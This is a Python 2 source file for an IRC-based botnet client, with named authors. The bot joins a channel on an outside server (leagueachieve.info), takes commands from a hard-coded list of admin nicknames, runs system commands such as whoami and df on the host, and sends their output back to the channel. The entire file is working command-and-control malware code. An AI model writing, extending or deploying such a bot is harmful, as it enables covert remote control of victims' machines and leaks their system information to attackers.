#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os
import subprocess as sub
from sys import argv
from random import randint

def genNick():
	flavor = execute('uname')
	rannum = str(randint(0000, 9999))
	return str(flavor[:3] + rannum)

def execute(cmd):
        p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
        output, errors = p.communicate()

        #handling multi-line output
        lines = []
	temp = ""
        for letter in output:
                if (letter == '\n'):
                        lines.append(temp)
                        temp = ""
                else:
                        temp = temp + letter

        #return one element if just a one-liner
        if (len(lines) == 1):
                return lines[0]

        #return the whole list
        else:
                return lines

#debugger
DEBUG = 0
if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
	DEBUG = 1

#IRC Settings
admins = ["king", "samorizu", "blackbear", "bigshebang"]
server = "leagueachieve.info"
port = 6667
channel = "#lobby"
botnick = genNick()

print "The botnick is:", botnick

#All of the possible functions that the botnet is capable of
def reply(): #send back to IRC server that you are here
	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')

def whoAmI(): #execute whoami command and send output
	cmd  = execute("whoami")
	irc.send('PRIVMSG ' + channel + " :" + cmd + '\r\n')

def iAmGood(): #send back to IRC server that you are good
	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')

def getAge(): #send uptime
	irc.send('PRIVMSG ' + channel + " :I don't know how to do that yet boss." + '\r\n')

def terminate(): #terminate program and send goodbye message
	irc.send('PRIVMSG ' + channel + " :Oh no! We better find some cover." + '\r\n')
	exit()

def freeSpace():
	cmd = execute("df")
	for line in cmd:
		irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')

#dictionary of functions
commands = {
	"are you there" : reply,
	"how are you" : iAmGood,
	"who are you" : whoAmI,
	"how old are you" : getAge,
	"zombie apocalypse" : terminate,
	"free" : freeSpace
}

#function which parses the command and determine how to handle it
def parseCommand(command):
	if DEBUG:
		print "command is '%s'" % command
	arg = "PRIVMSG"
	if (arg in command):
		user = command[1:command.index("!~")] #user sending message
		host = command[(command.index("!~") + 2):command.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
		hostname = host[:host.index("@")] #hostname: 'blarg'
		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
		if DEBUG:
			print "user is '%s'" % user
			print "host is '%s'" % host
			print "hostname is '%s'" % hostname
			print "client is '%s'" % client
		if user in admins:
			tempCommand = command[command.index(arg):]
			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
			
			print "Recieved %s from the CNC" % command
			if command in commands.keys():
				commands[command]()
				print "function called"
			else:
				print "command '%s' not defined" % command
		else:
			print "user '%s' not in list of admins" % user


#Connecting to the IRC Server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
print "connecting to: "+server
irc.connect((server, port)) #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
irc.send("NICK "+ botnick +"\n") #sets nick

temp=irc.recv(4096) #get response to setting nick
if DEBUG:
		print "text received: '%s'" % temp

counter = 2
while "nickname already in use" in temp.lower():
	irc.send("NICK " + botnick + "-" + str(counter) + "\n") #sets nick
	temp=irc.recv(4096) #get response to setting nick
	if DEBUG:
		print "text received: '%s'\niteration %d" % (temp, counter)
	counter += 1

irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
irc.send("JOIN "+ channel +"\n") #join the channel

#infinite loop to listen for messages aka commands
while 1:
	text=irc.recv(4096)  #receive up to 4096 bytes
	lines = text.split("\n") #split commands based on new lines

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1: #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

	parseCommand(text) #call function to parse commands
